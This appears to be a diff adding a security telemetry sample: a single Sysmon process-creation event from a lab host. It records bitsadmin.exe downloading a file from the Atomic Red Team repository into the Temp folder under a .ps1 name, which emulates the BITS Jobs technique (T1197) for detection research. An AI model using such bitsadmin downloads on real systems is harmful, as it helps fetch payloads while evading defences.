@@ -1,0 +1,33 @@
+[
+  {
+    "@timestamp": "2020-10-23T02:36:43.547Z",
+    "Channel": "Microsoft-Windows-Sysmon/Operational",
+    "CommandLine": "bitsadmin.exe  /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Users\\wardog\\AppData\\Local\\Temp\\bitsadmin1_flag.ps1",
+    "Company": "Microsoft Corporation",
+    "CurrentDirectory": "C:\\Users\\wardog\\",
+    "Description": "BITS administration utility",
+    "EventID": 1,
+    "FileVersion": "7.8.18362.1 (WinBuild.160101.0800)",
+    "Hashes": "SHA1=282DA9EE622F01CC63352E53FDC3D4A75CEEB6FD,MD5=A23A7A6B6F8E1A5D913EA119F5F2ED1A,SHA256=EAAE8536D554D0E86D8540A8B34DB2649BD884843F389495D0B6E91636C6CF54,IMPHASH=B0A3CFF8CFDE112945189719F82F9EA9",
+    "Hostname": "WORKSTATION5",
+    "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+    "IntegrityLevel": "High",
+    "Level": "4",
+    "LogonGuid": "{39e4a257-f1ac-5f8b-d961-0c0000000000}",
+    "LogonId": "0xc61d9",
+    "OriginalFileName": "bitsadmin.exe",
+    "ParentCommandLine": "\"C:\\windows\\system32\\cmd.exe\" ",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "ParentProcessGuid": "{39e4a257-79ed-5f92-6e17-000000000700}",
+    "ParentProcessId": "10044",
+    "ProcessGuid": "{39e4a257-79fb-5f92-7117-000000000700}",
+    "ProcessId": "9260",
+    "Product": "Microsoft® Windows® Operating System",
+    "RuleName": "-",
+    "SourceName": "Microsoft-Windows-Sysmon",
+    "TerminalSessionId": "2",
+    "TimeCreated": "2020-10-23T02:36:43.547Z",
+    "User": "WORKSTATION5\\wardog",
+    "UtcTime": "2020-10-23 06:36:43.542"
+  }
+]
